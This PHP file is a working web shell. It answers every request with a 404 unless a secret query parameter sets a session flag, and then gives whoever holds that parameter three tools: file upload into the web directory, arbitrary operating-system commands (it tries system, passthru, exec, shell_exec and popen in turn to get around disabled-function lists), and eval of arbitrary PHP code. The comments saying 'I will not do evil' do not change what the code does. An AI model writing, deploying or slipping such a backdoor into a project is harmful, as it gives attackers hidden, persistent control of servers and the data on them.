<?php
session_start();

if (!isset($_SESSION["cursed"]) && !isset($_GET["6"])) {
	die(http_response_code(404));
} else if (!isset($_SESSION["cursed"]) && isset($_GET["6"])) {
	$_SESSION["cursed"] = 666;
}

if (!isset($_GET["u"]) && !isset($_GET["s"]) && !isset($_GET["e"])) {
	die(http_response_code(404));
}

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

function suhosin_func_exists($func) {
    if(in_array($func,array("include","include_once","require","require_once"))) return true; 
    $dis = @ini_get('disable_functions') .','. @ini_get('suhosin.executor.func.blacklist');
    if(@ini_get("safe_mode") != false) empty($dis) ? $dis = "passthru,popen,proc_open,shell_exec,exec,system" : $dis .= ",passthru,popen,proc_open,shell_exec,exec,system"; 
    return in_array($func,explode(",",$dis)) === false? function_exists($func) : false;  
    // I will not do evil.
}

function terminal($command)
{
    //system
    if(suhosin_func_exists('system'))
    {
        ob_start();
        system($command , $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    }
    //passthru
    else if(suhosin_func_exists('passthru'))
    {
        ob_start();
        passthru($command , $return_var);
        $output = ob_get_contents();
        ob_end_clean();
    }
    //exec
    else if(suhosin_func_exists('exec'))
    {
		// I will not do evil.
        exec($command , $output , $return_var);
        $output = implode("n" , $output);
    }
    //shell_exec
    else if(suhosin_func_exists('shell_exec'))
    {
        $output = shell_exec($command) ;
    }
    //popen
    else if(suhosin_func_exists('popen'))
    {
        $output = popen($command, "r") ;
    }
    else
    {
        $output = 'Command execution not possible on this system';
        $return_var = 1;
    }
     
    return array('output' => $output , 'status' => $return_var);
}

?>

<head>
<style>
<!--
p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}-->
</style>
</head>

<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#66" cellpadding="5" height="1" width="100%" bgcolor="black" bordercolorlight="#c0c0c0" border="1">
    <tr>
        <a bookmark="minipanel" style="font-weight: normal; color: #009900; font-family: verdana; text-decoration: none">
        <td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px">
    	<?php
    	if (isset($_GET["u"])) {
	    	?>
	        <center>Upload<form method="POST" enctype="multipart/form-data">
	            <input type="hidden" name="act" value="upload" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900">
	            <input type="file" name="userfile" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900">
	            <input type="submit" name="submit" value="Upload" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900"><br><br>
	            <?php
				if (isset($_FILES['userfile']['name'])) {
					$uploaddir = "";
					$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
					if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
						echo "The file ". basename($_FILES['userfile']['name']) ." has been uploaded";
					} else {
						echo "There was an error uploading the file. please try again!";
					}
				}
				?>
	        </form>
	        </center>
	        <?php
    	} else if (isset($_GET["s"])) {
	    	?>
	        <center>System<form method="POST" enctype="multipart/form-data">
	            <input type="hidden" name="act" value="upload" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900">
	            <input type="text" name="system" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900">
	            <input type="submit" name="submit" value="Exec" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900"><br><br>
	            <?php
				if (isset($_POST["system"])) {
				  echo '<pre>'.htmlentities(terminal(' '.$_POST["system"])["output"]).'</pre>';
				}
				?>
	        </form>
	        </center>
	        <?php
    	} else if (isset($_GET["e"])) {
	    	?>
	        <center>Eval<form method="POST" enctype="multipart/form-data">
	            <input type="hidden" name="act" value="upload" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900">
	            <input type="text" name="system" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900">
	            <input type="submit" name="submit" value="Exec" style="font-size: 8pt; color: white; font-family: Tahoma; border: 1 solid #66; background-color: #009900"><br><br>
	            <?php
				if (isset($_POST["system"])) {
				  echo '<pre>'.htmlentities(eval($_POST["system"])).'</pre>';
				}
				?>
	        </form>
	        </center>
	        <?php
    	}
        ?>
    </td>
    </tr>
</table>
</a>